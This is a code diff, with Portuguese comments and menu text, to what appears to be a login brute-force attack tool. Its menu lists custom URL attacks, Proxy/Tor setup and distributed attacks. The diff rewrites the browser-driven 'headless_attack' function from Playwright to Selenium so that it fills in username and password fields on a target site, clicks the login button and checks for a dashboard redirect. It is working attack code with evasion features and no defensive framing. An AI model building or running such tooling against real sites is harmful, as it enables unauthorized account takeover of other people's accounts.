@@ -19,7 +19,11 @@ from fake_useragent import UserAgent
 import warnings
 import json
 from pathlib import Path
-from playwright.async_api import async_playwright
+from selenium import webdriver
+from selenium.webdriver.common.by import By
+from selenium.webdriver.support.ui import WebDriverWait
+from selenium.webdriver.support import expected_conditions as EC
+from selenium.common.exceptions import TimeoutException
 from transformers import pipeline
 from celery import Celery
 from redis import Redis
@@ -115,7 +119,7 @@ def menu():
     table.add_row("2. Ataque a URL Customizada")
     table.add_row("3. Configurar Proxy/Tor")
     table.add_row("4. Configurações Avançadas")
-    table.add_row("5. Ataque com Navegador Headless")
+    table.add_row("5. Ataque com Navegador (Selenium)")
     table.add_row("6. Ataque Distribuído")
     table.add_row("7. Sair")
     console.print(table)
@@ -323,20 +327,56 @@ def adaptive_delay(target_url):
         return base_delay * 2
     return base_delay
 
-async def headless_attack(url, username, password):
-    async with async_playwright() as p:
-        browser = await p.chromium.launch(headless=False)
-        page = await browser.new_page()
+def headless_attack(url, username, password):
+    try:
+        # Configuração para o Termux (usando ChromeDriver)
+        options = webdriver.ChromeOptions()
+        options.add_argument('--headless')
+        options.add_argument('--no-sandbox')
+        options.add_argument('--disable-dev-shm-usage')
         
-        await page.goto(url)
-        await page.fill('input[name="username"]', username)
-        await page.fill('input[name="password"]', password)
+        # Você precisará ter o chromedriver instalado no Termux
+        driver = webdriver.Chrome(options=options)
         
-        submit_selector = 'button:has-text("Log in"), input[type="submit"]'
-        await page.click(submit_selector)
+        driver.get(url)
         
-        if 'dashboard' in page.url or 'home' in page.url:
-            return True
+        # Tenta encontrar campos de login
+        username_field = WebDriverWait(driver, 10).until(
+            EC.presence_of_element_located((By.NAME, "username"))
+        )
+        password_field = WebDriverWait(driver, 10).until(
+            EC.presence_of_element_located((By.NAME, "password"))
+        )
+        
+        username_field.send_keys(username)
+        password_field.send_keys(password)
+        
+        # Tenta encontrar e clicar no botão de login
+        login_button = WebDriverWait(driver, 10).until(
+            EC.element_to_be_clickable((By.XPATH, "//button[contains(text(),'Log in') or contains(text(),'Sign in')]"))
+        )
+        login_button.click()
+        
+        # Verifica se o login foi bem-sucedido
+        WebDriverWait(driver, 10).until(
+            lambda d: "dashboard" in d.current_url.lower() or "home" in d.current_url.lower()
+        )
+        
+        driver.quit()
+        return True
+        
+    except TimeoutException:
+        try:
+            driver.quit()
+        except:
+            pass
+        return False
+    except Exception as e:
+        console.print(f"[error]Erro no navegador: {str(e)}[/]")
+        try:
+            driver.quit()
+        except:
+            pass
         return False
 
 def brute_force_worker(url, username, password, timeout=10):
@@ -565,8 +605,7 @@ def main():
                 username = console.input("[prompt]Digite o nome de usuário: [/]")
                 password = console.input("[prompt]Digite a senha para testar: [/]")
                 
-                import asyncio
-                success = asyncio.run(headless_attack(url, username, password))
+                success = headless_attack(url, username, password)
                 if success:
                     console.print("[success]Login bem-sucedido no modo headless![/]")
                 else:
